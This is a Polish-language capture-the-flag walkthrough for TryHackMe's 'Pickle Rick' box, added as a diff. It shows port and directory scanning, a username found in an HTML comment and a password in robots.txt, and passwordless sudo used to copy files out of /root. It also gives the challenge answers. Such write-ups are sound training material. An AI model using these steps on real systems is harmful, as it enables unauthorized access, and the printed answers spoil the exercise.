@@ -1,1 +1,154 @@
+Walkthrough: Pickle Rick CTF
+📌 Informacje wstępne
+CTF: Pickle Rick (TryHackMe)
 
+Cel: Znalezienie 3 składników potrzebnych Rickowi do przemiany z ogórka z powrotem w człowieka
+
+Adres IP: 10.80.140.183
+
+Poziom: Łatwy
+====================================================================================================
+
+🔍 Krok 1: Rozpoznanie
+Skanowanie portów (Nmap)
+bash
+nmap -sV 10.80.140.183
+Wynik:
+
+Port 22 (SSH) - otwarty
+
+Port 80 (HTTP) - otwarty
+
+====================================================================================================
+
+🌐 Krok 2: Analiza strony głównej
+Przechodzimy na http://10.80.140.183 i widzimy wiadomość od Ricka:
+
+"Listen Morty... I need your help, I've turned myself into a pickle again..."
+
+Inspekcja kodu źródłowego
+Prawy przycisk myszy → "Zbadaj" (Inspect)
+W komentarzu HTML znajdujemy:
+
+html
+<!-- Note to self, remember username! Username: R1ckRul3s -->
+Uzyskane dane:
+
+Nazwa użytkownika: R1ckRul3s
+
+====================================================================================================
+
+📁 Krok 3: Enumeracja katalogów
+Użycie Dirsearch
+bash
+dirsearch -u http://10.80.140.183
+Znalezione zasoby:
+
+/assets/ - katalog z zasobami
+
+/login.php - strona logowania
+
+/robots.txt - plik robots.txt
+
+====================================================================================================
+
+🔐 Krok 4: Analiza pliku robots.txt
+Przechodzimy na http://10.80.140.183/robots.txt
+
+Zawartość:
+
+text
+Wubbalubbadubdub
+Wnioski: Prawdopodobnie jest to hasło.
+
+====================================================================================================
+
+🚪 Krok 5: Logowanie
+Przechodzimy na http://10.80.140.183/login.php
+
+Wprowadzamy dane:
+
+Username: R1ckRul3s
+
+Password: Wubbalubbadubdub
+
+Sukces! Zyskujemy dostęp do panelu z konsolą.
+
+====================================================================================================
+
+💻 Krok 6: Eksploracja systemu plików
+Listowanie plików
+bash
+ls -a
+Wynik:
+
+text
+.
+..
+Sup3rS3cretPickl3Ingred.txt
+assets
+clue.txt
+denied.php
+index.html
+login.php
+portal.php
+robots.txt
+Pierwszy składnik
+Próba odczytu pliku Sup3rS3cretPickl3Ingred.txt przez konsolę nie udaje się (komenda cat zablokowana). Odczytujemy przez przeglądarkę:
+
+text
+http://10.80.140.183/Sup3rS3cretPickl3Ingred.txt
+Składnik 1: mr. meeseek hair
+
+Drugi składnik
+Czytamy wskazówkę z clue.txt (przez przeglądarkę):
+
+text
+Look around the file system for the other ingredient.
+Sprawdzamy katalog /home/rick:
+
+bash
+ls /home/rick
+Znajdujemy plik second ingredients.
+
+Kopiowanie pliku
+Sprawdzamy uprawnienia sudo:
+
+bash
+sudo -l
+Wynik pokazuje, że mamy pełne uprawnienia sudo (bez hasła).
+
+Kopiujemy plik do bieżącego katalogu:
+
+bash
+sudo cp /home/rick/second\ ingredients ./second.txt
+Odczytujemy przez przeglądarkę:
+
+text
+http://10.80.140.183/second.txt
+Składnik 2: 1 jerry tear
+
+Trzeci składnik
+Sprawdzamy katalog /root:
+
+bash
+sudo ls /root
+Znajdujemy plik 3rd.txt.
+
+Kopiujemy plik:
+
+bash
+sudo cp /root/3rd.txt .
+Odczytujemy przez przeglądarkę:
+
+text
+http://10.80.140.183/3rd.txt
+Składnik 3: fleeb juice
+
+🏆 Podsumowanie
+Znalezione składniki:
+mr. meeseek hair
+
+1 jerry tear
+
+fleeb juice
